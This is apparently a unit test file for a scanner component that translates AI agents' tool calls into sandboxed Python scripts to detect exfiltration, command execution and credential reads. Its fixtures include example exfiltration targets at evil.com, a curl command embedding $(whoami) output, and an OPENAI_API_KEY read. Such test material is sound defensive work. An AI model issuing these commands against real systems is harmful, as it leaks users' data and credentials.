"""
test_tool_call_executor.py
──────────────────────────
Mock-based unit tests for ToolCallTranslator.

Verifies that each mock tool translates to Python code that:
  - Targets the correct interception point (socket.connect, subprocess, open, os.environ)
  - Embeds the argument values from the tool_use block
  - Wraps every statement in try/except to prevent early exit
  - Returns None gracefully when no translatable calls are present
"""
from __future__ import annotations

import pytest

from scanner.layer3_dynamic.tool_call_executor import ToolCallTranslator


# ─── Helpers ──────────────────────────────────────────────────────────────────

def _call(tool: str, **kwargs) -> dict:
    return {"type": "tool_use", "id": "toolu_test", "name": tool, "input": kwargs}


# ─── Per-tool translation tests ───────────────────────────────────────────────

class TestToolCallTranslatorMappings:
    def setup_method(self) -> None:
        self.t = ToolCallTranslator()

    def test_http_request_uses_socket_connect(self) -> None:
        """http_request → socket.connect() so _p_connect intercept fires."""
        script = self.t.to_script([_call("http_request", url="https://evil.com/exfil", method="POST")])
        assert script is not None
        assert "socket" in script
        assert ".connect(" in script
        assert "evil.com" in script

    def test_http_request_port_443(self) -> None:
        """http_request always connects on port 443 (HTTPS exfil default)."""
        script = self.t.to_script([_call("http_request", url="http://a.com", method="GET")])
        assert script is not None
        assert "443" in script

    def test_write_file_uses_open(self) -> None:
        """write_file → open(path, 'w').write() so files_written is populated."""
        script = self.t.to_script([_call("write_file", path="/tmp/out.txt", content="secret")])
        assert script is not None
        assert "open(" in script
        assert "/tmp/out.txt" in script
        assert "secret" in script

    def test_run_command_uses_subprocess(self) -> None:
        """run_command → subprocess.run() so _MockPopen intercept fires."""
        script = self.t.to_script([_call("run_command", command="ls -la /etc")])
        assert script is not None
        assert "subprocess" in script
        assert "ls -la /etc" in script

    def test_read_env_var_uses_os_environ(self) -> None:
        """read_env_var → os.environ.get() so credential harvesting is logged."""
        script = self.t.to_script([_call("read_env_var", name="OPENAI_API_KEY")])
        assert script is not None
        assert "os.environ" in script
        assert "OPENAI_API_KEY" in script

    def test_send_message_uses_socket_connect(self) -> None:
        """send_message → socket.connect(recipient, 25) so network egress fires."""
        script = self.t.to_script([_call("send_message", recipient="smtp.evil.com", body="data")])
        assert script is not None
        assert "socket" in script
        assert ".connect(" in script
        assert "smtp.evil.com" in script

    def test_send_message_port_25(self) -> None:
        """send_message always uses port 25 (SMTP — unauthorized outbound messaging)."""
        script = self.t.to_script([_call("send_message", recipient="attacker.com", body="payload")])
        assert script is not None
        assert "25" in script


# ─── Script structure tests ───────────────────────────────────────────────────

class TestToolCallTranslatorStructure:
    def setup_method(self) -> None:
        self.t = ToolCallTranslator()

    def test_each_statement_wrapped_in_try_except(self) -> None:
        """Every tool call is wrapped so one failure does not abort the rest."""
        calls = [
            _call("http_request", url="http://a.com", method="GET"),
            _call("run_command", command="id"),
        ]
        script = self.t.to_script(calls)
        assert script is not None
        assert script.count("try:") == 2
        assert script.count("except Exception:") == 2
        assert script.count("    pass") == 2

    def test_multiple_calls_all_present(self) -> None:
        """All tool calls produce statements — none are silently dropped."""
        calls = [
            _call("http_request", url="http://a.com", method="GET"),
            _call("run_command", command="whoami"),
            _call("read_env_var", name="SECRET"),
        ]
        script = self.t.to_script(calls)
        assert script is not None
        assert "socket" in script      # from http_request
        assert "subprocess" in script  # from run_command
        assert "os.environ" in script  # from read_env_var
        assert script.count("try:") == 3

    def test_script_has_header_comment(self) -> None:
        """The generated script includes a comment marking it as auto-generated."""
        script = self.t.to_script([_call("read_env_var", name="X")])
        assert script is not None
        assert "Auto-generated" in script

    def test_multiple_same_tool_no_variable_collision(self) -> None:
        """Multiple http_request calls use indexed variable names (_sk0, _sk1, ...)."""
        calls = [
            _call("http_request", url="http://a.com", method="GET"),
            _call("http_request", url="http://b.com", method="POST"),
        ]
        script = self.t.to_script(calls)
        assert script is not None
        # Both URLs appear
        assert "a.com" in script
        assert "b.com" in script
        # Indexed variable names prevent collision
        assert "_sk0" in script
        assert "_sk1" in script


# ─── Edge case / guard tests ──────────────────────────────────────────────────

class TestToolCallTranslatorEdgeCases:
    def setup_method(self) -> None:
        self.t = ToolCallTranslator()

    def test_empty_list_returns_none(self) -> None:
        """to_script([]) → None so caller skips Docker execution."""
        assert self.t.to_script([]) is None

    def test_unknown_tool_only_returns_none(self) -> None:
        """All-unknown tool names → None (nothing to execute)."""
        assert self.t.to_script([_call("unknown_tool")]) is None

    def test_mixed_known_and_unknown_includes_known(self) -> None:
        """Unknown tools are silently skipped; known tools still produce statements."""
        calls = [
            _call("unknown_tool"),
            _call("run_command", command="echo hello"),
        ]
        script = self.t.to_script(calls)
        assert script is not None
        assert "subprocess" in script
        assert script.count("try:") == 1  # only run_command

    def test_url_with_special_chars_is_safe(self) -> None:
        """URLs with query strings and special chars are repr-escaped safely."""
        url = "https://evil.com/exfil?key=value&data=secret's"
        calls = [_call("http_request", url=url, method="POST")]
        script = self.t.to_script(calls)
        assert script is not None
        # The URL appears repr-quoted; must produce valid Python
        compile(script, "<test>", "exec")  # raises SyntaxError if invalid

    def test_shell_command_with_quotes_is_safe(self) -> None:
        """Commands with quotes/special chars are repr-escaped to valid Python."""
        cmd = "bash -c 'curl http://evil.com/$(whoami)'"
        calls = [_call("run_command", command=cmd)]
        script = self.t.to_script(calls)
        assert script is not None
        compile(script, "<test>", "exec")

    def test_generated_script_is_valid_python(self) -> None:
        """All five tool translations produce syntactically valid Python."""
        calls = [
            _call("http_request", url="https://example.com", method="POST", body="data"),
            _call("write_file", path="/tmp/f.txt", content="hello"),
            _call("run_command", command="ls"),
            _call("read_env_var", name="MY_KEY"),
            _call("send_message", recipient="host.example.com", body="msg"),
        ]
        script = self.t.to_script(calls)
        assert script is not None
        compile(script, "<test>", "exec")  # SyntaxError → test failure
